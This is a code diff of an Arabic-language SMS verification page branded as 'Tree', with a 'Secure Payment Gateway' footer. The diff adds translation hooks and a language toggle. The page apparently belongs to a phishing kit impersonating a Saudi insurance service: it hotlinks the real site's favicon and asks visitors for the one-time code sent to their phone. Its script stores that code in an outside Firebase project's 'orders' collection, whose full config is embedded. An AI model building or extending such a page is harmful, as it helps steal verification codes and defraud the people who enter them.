@@ -4,9 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="js/theme-toggle.js"></script>
-    <title>تأكيد الجوال</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="js/i18n.js"></script>
+    <title>تأكيد الجوال | SMS Verification</title>
+    <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/site-theme.css">
     <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
@@ -33,40 +34,41 @@
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
 <nav class="navbar">
-    <div class="container-fluid">
-        <img src="images/logo.png" class="nav-logo" alt="Tree">
+    <div class="container-fluid d-flex justify-content-between align-items-center">
+        <img src="images/logo.png" class="nav-logo" alt="Tree" onerror="this.src='https://placehold.co/100x35/198754/ffffff?text=TREE'">
+        <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
     </div>
 </nav>
 
 <div class="main-content">
     <div class="form-wrapper">
         <div class="icon-box">📩</div>
-        <h3 class="fw-bold text-success mb-3">تحقيق رقم الجوال</h3>
-        
+        <h3 class="fw-bold text-success mb-3" data-i18n="sms.title">تحقيق رقم الجوال</h3>
+
         <p class="text-muted mb-4" style="line-height: 1.6;">
-            تم ارسال رسالة نصية إلى جوالك لربط الوثيقة على رقم الهاتف الخاص بك!
+            <span data-i18n="sms.msg">تم ارسال رسالة نصية إلى جوالك لربط الوثيقة على رقم الهاتف الخاص بك!</span>
             <br>
-            يرجي ادخال رمز التحقق المرسل إلى جوالك رقم:
+            <span data-i18n="sms.enter_prompt">يرجي ادخال رمز التحقق المرسل إلى جوالك رقم:</span>
             <br>
             <span class="text-dark fw-bold" style="direction: ltr; display: inline-block; margin-top: 5px;" id="displayPhone">...</span>
         </p>
 
         <form onsubmit="verifyCode(event)">
             <div class="mb-3 text-start">
-                <label class="form-label fw-bold small text-dark">رمز التحقق *</label>
-                <input type="tel" class="form-control" id="smsCode" placeholder="ادخل رمز التحقق الذي تم ارساله إلى جوالك" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                <label class="form-label fw-bold small text-dark" data-i18n="sms.code_label">رمز التحقق *</label>
+                <input type="tel" class="form-control" id="smsCode" data-i18n="sms.code_ph" placeholder="ادخل رمز التحقق الذي تم ارساله إلى جوالك" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
             </div>
 
             <div class="text-muted small mb-2">
-                سيتم إرسال رسالة كود التحقق في خلال <span class="text-danger fw-bold" id="timer">01:00</span>
+                <span data-i18n="sms.resend_in">سيتم إرسال رسالة كود التحقق في خلال</span> <span class="text-danger fw-bold" id="timer">01:00</span>
             </div>
 
-            <button type="submit" class="btn-submit" id="submitBtn">تأكيد</button>
+            <button type="submit" class="btn-submit" id="submitBtn" data-i18n="sms.confirm">تأكيد</button>
         </form>
     </div>
 </div>
 
-<div class="site-footer">Secure Payment Gateway © 2024</div>
+<div class="site-footer" data-i18n="footer.secure">Secure Payment Gateway © 2024</div>
 
 <script>
     const firebaseConfig = { apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE", authDomain: "tameen-658e9.firebaseapp.com", projectId: "tameen-658e9", storageBucket: "tameen-658e9.firebasestorage.app", messagingSenderId: "292670676256", appId: "1:292670676256:web:3624157751cd194efe4b45" };
@@ -101,10 +103,10 @@
         const code = document.getElementById('smsCode').value;
         const btn = document.getElementById('submitBtn');
         
-        if(code.length < 4 || !/^\d+$/.test(code)) return alert("الرمز غير صحيح (يجب أن يكون أرقام فقط)");
+        if(code.length < 4 || !/^\d+$/.test(code)) return alert(t('sms.err_invalid'));
 
         btn.disabled = true;
-        btn.innerText = "جاري التحقق...";
+        btn.innerText = t('sms.verifying');
 
         try {
             await db.collection("orders").doc(userId).update({
